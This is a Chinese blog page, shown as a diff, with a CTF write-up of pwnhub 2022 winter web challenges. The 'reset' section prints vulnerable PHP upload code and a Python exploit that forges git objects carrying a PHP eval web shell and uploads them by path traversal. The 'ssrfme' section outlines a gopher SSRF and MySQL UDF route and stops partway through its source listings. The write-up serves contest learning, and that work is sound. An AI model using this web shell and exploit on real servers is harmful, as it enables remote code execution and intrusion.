@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="ch">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="M0deration">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="M0deration">
+    
+    <meta name="keywords" content="hexo,ctf,web安全">
+    
+    <meta name="description" content="">
+    <meta name="description" content="2022 pwnhub 冬季赛Webreset reset290 you know git, control it.  这题让我们好好学习了git，说来惭愧都已经是研一的学生对于git还是一知半解 题目提示了git所以首先使用了githack去探测一下，发现有.git泄露可以脱下来源码 关键的就是reset.php和upload.php upload.php 1234567891011121314">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022 pwnhub 冬季赛">
+<meta property="og:url" content="https://github.com/Dsi13nc3/2022/12/22/2022%20pwnhub%20%E5%86%AC%E5%AD%A3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="2022 pwnhub 冬季赛Webreset reset290 you know git, control it.  这题让我们好好学习了git，说来惭愧都已经是研一的学生对于git还是一知半解 题目提示了git所以首先使用了githack去探测一下，发现有.git泄露可以脱下来源码 关键的就是reset.php和upload.php upload.php 1234567891011121314">
+<meta property="og:locale">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224104-520219.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224141-593643.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224147-931436.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224149-929726.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224208-266227.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224209-592011.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224216-667818.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224219-264852.png">
+<meta property="og:image" content="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731153724.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224222-733588.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224226-246629.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224228-45319.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224229-755688.png">
+<meta property="article:published_time" content="2022-12-22T13:31:53.000Z">
+<meta property="article:modified_time" content="2022-12-22T14:45:13.838Z">
+<meta property="article:author" content="M0deration">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224104-520219.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>2022 pwnhub 冬季赛 · M0deration&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/Ess3nce.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >M0deration&#39;s blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2022 pwnhub 冬季赛</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>M0deration's blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2022 pwnhub 冬季赛
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.4k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2022/12/22</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="2022-pwnhub-冬季赛"><a href="#2022-pwnhub-冬季赛" class="headerlink" title="2022 pwnhub 冬季赛"></a>2022 pwnhub 冬季赛</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h2><blockquote>
+<p><strong>reset<br>290</strong></p>
+<p>you know git, control it.</p>
+</blockquote>
+<p>这题让我们好好学习了git，说来惭愧都已经是研一的学生对于git还是一知半解</p>
+<p>题目提示了git所以首先使用了githack去探测一下，发现有.git泄露可以脱下来源码</p>
+<p>关键的就是reset.php和upload.php</p>
+<p>upload.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $fileType = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $fileName = $_POST[<span class="string">&#x27;filename&#x27;</span>] ?? <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">    $size = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    $error = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    $whiteList = <span class="keyword">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;image/jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check type, size, error</span></span><br><span class="line">    in_array($fileType, $whiteList) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Invalid file!1&#x27;</span>);</span><br><span class="line">    $size &lt; <span class="number">20000</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Invalid file!2&#x27;</span>);</span><br><span class="line">    $error &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">die</span>($error);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check filename</span></span><br><span class="line">    preg_match(<span class="string">&#x27;/[a-zA-Z0-9_]&#123;10,&#125;$/&#x27;</span>, $fileName) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Invalid file type!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./upload/&quot;</span>.$fileName)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;file upload failed.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;saved-&gt; &#x27;</span>.$fileName. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>reset.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    $id = $_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    preg_match(<span class="string">&#x27;/^[a-z0-9]&#123;40&#125;$/&#x27;</span>, $id) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Invalid commit id!&#x27;</span>);</span><br><span class="line">    system(<span class="string">&quot;git reset --hard <span class="subst">$id</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面两个文件只截取了关键部分</p>
+<p>其实就是有一个文件上传点还有一个代码回滚的地方，但是对于回滚字段限制只能是40位的字母+数字，但是上传的文件名处只限制了匹配到大于10位由字母和数字组成文件名就可以（其他那些都可以绕）</p>
+<p>这题我们当时拿到的思路就是上传一个commit包含恶意文件然后让他回滚到我们的commit就可以出现我们的恶意文件了，但是对于.git文件夹下的内容不熟悉不知道该如何入手，先去浅浅学习一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.notion.so/git-git-a7f9ceca9fbe460294157d805aaad5f0"><strong><strong>解析.git文件夹，深入了解git内部原理</strong></strong></a></p>
+<p>我们比赛中并没有及时去恶补git原理，就是去忙猜</p>
+<h3 id="失败尝试"><a href="#失败尝试" class="headerlink" title="失败尝试"></a>失败尝试</h3><p>刚开始认为只要commit那次hash前两位和文件夹对应上就可以了(读了前面的原理就知道(blob commit tree都会生成新的hash文件)，因为他内部objects中已有的文件夹有限，我们想着爆破commit前两位，后来本地实验只把commit传入回滚会显示找不到tree</p>
+<p>（看完上面原理发现这个操作很傻x，所以还是需要懂原理再去试）</p>
+<h3 id="成功尝试"><a href="#成功尝试" class="headerlink" title="成功尝试"></a>成功尝试</h3><p>我们这个不知道算不算非预期了，我们自己建立一个仓库写入shell.php，然后add commit然后利用git cat-file去找到shell.php的blob，把blob的文件名改成远程仓库中index.php或者其他文件的blob的文件名</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224104-520219.png" alt="Untitled"></p>
+<p>我当时是直接换成了f1ef5c03448a1eb5571dd348cf717a7bad7402</p>
+<p>然后上传到5f文件夹下</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224141-593643.png" alt="Untitled"></p>
+<p>然后回滚一下当前版本就会发现index.php变成我们写的shell了😂</p>
+<p>看了NULL的解法是一步一步生成blob再生成tree最后生成commit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytricks</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">obj</span>(<span class="params">content:bytes,type=<span class="string">&#x27;blob&#x27;</span></span>) -&gt; bytes:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;type&#125;</span> <span class="subst">&#123;len(content)&#125;</span>\x00&quot;</span>.encode()+content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clash</span>(<span class="params">content,type</span>):</span></span><br><span class="line">	matches = [<span class="string">&#x27;07&#x27;</span>,<span class="string">&#x27;5b&#x27;</span>,<span class="string">&#x27;5d&#x27;</span>,<span class="string">&#x27;5f&#x27;</span>,<span class="string">&#x27;75&#x27;</span>,<span class="string">&#x27;87&#x27;</span>,<span class="string">&#x27;c3&#x27;</span>,<span class="string">&#x27;c9&#x27;</span>,<span class="string">&#x27;ca&#x27;</span>,<span class="string">&#x27;f7&#x27;</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">		t = content % str(i).encode()</span><br><span class="line">		t = obj(t,type)</span><br><span class="line">		sha1 = t.sha1()</span><br><span class="line">		<span class="keyword">if</span>(sha1[:<span class="number">2</span>] <span class="keyword">in</span> matches):</span><br><span class="line">			<span class="keyword">return</span> t,sha1</span><br><span class="line">shell = <span class="string">b&quot;&quot;&quot;&lt;?php eval($_REQUEST[1]);//%s&quot;&quot;&quot;</span></span><br><span class="line">c,h = clash(shell,<span class="string">&#x27;blob&#x27;</span>)</span><br><span class="line">c=zlib.compress(c)</span><br><span class="line">print(h)</span><br><span class="line">res = requests.post(<span class="string">&#x27;http://47.97.127.1:25826/upload.php&#x27;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:</span><br><span class="line">(<span class="string">&#x27;f&#x27;</span>,c,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;,data=</span><br><span class="line">&#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">f&#x27;../.git/objects/<span class="subst">&#123;h[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;h[<span class="number">2</span>:]&#125;</span>&#x27;</span>&#125;,proxies=</span><br><span class="line">&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8088&#x27;</span>&#125;)</span><br><span class="line">print(res.text.findall(<span class="string">r&#x27;saved-&gt; .*&#x27;</span>))</span><br><span class="line"></span><br><span class="line">tree = <span class="string">b&#x27;100644</span></span><br><span class="line"><span class="string">%s.php\x00&#x27;</span>+bytes.fromhex(<span class="string">&#x27;f7f3c660ba332cf0f3f6debcdde2af0b916329bd&#x27;</span>)</span><br><span class="line">c,h = clash(tree,<span class="string">&#x27;tree&#x27;</span>)</span><br><span class="line">c=zlib.compress(c)</span><br><span class="line">print(h)</span><br><span class="line">res=requests.post(<span class="string">&#x27;http://47.97.127.1:25826/upload.php&#x27;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:</span><br><span class="line">(<span class="string">&#x27;f&#x27;</span>,c,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;,data=&#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">f&#x27;../.git/objects/<span class="subst">&#123;h[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;h[<span class="number">2</span>:]&#125;</span>&#x27;</span>&#125;)</span><br><span class="line">print(res.text.findall(<span class="string">r&#x27;saved-&gt; .*&#x27;</span>))</span><br><span class="line"></span><br><span class="line">commit = <span class="string">b&#x27;tree 5f25c5acd577248e22068785e5fbd1a91a2d3458\nparent</span></span><br><span class="line"><span class="string">c9a4a016a1bd720a68f810776280619984e87e99\nauthor HSwift\n\n%s\n&#x27;</span></span><br><span class="line">c,h = clash(commit,<span class="string">&#x27;commit&#x27;</span>)</span><br><span class="line">c=zlib.compress(c)</span><br><span class="line">print(h)</span><br><span class="line">res=requests.post(<span class="string">&#x27;http://47.97.127.1:25826/upload.php&#x27;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:</span><br><span class="line">(<span class="string">&#x27;f&#x27;</span>,c,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;,data=&#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">f&#x27;../.git/objects/<span class="subst">&#123;h[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;h[<span class="number">2</span>:]&#125;</span>&#x27;</span>&#125;)</span><br><span class="line">print(res.text.findall(<span class="string">r&#x27;saved-&gt; .*&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><blockquote>
+<p><strong>ssrfme<br>320</strong></p>
+<p>小小的代码，大大的疑惑</p>
+<p>提示1：html.zip</p>
+</blockquote>
+<p>思路：ssrf gopher+mysql无密码  UDF提权</p>
+<p>源码：</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./lib/curl.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./lib/db.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;url&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $curl = <span class="keyword">new</span> curl();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($curl-&gt;filterURL($url) === <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $curl-&gt;getURL($url);</span><br><span class="line">    var_dump($ret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($ret[<span class="string">&#x27;url&#x27;</span>] &amp;&amp; $ret[<span class="string">&#x27;status&#x27;</span>])&#123;</span><br><span class="line">        $dbConfig = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;dbhost&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dbuser&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dbpass&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;dbname&#x27;</span> =&gt; <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        $db = <span class="keyword">new</span> db($dbConfig);</span><br><span class="line">        $db-&gt;add_url($ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>lib文件下</p>
+<p>db.class.php</p>
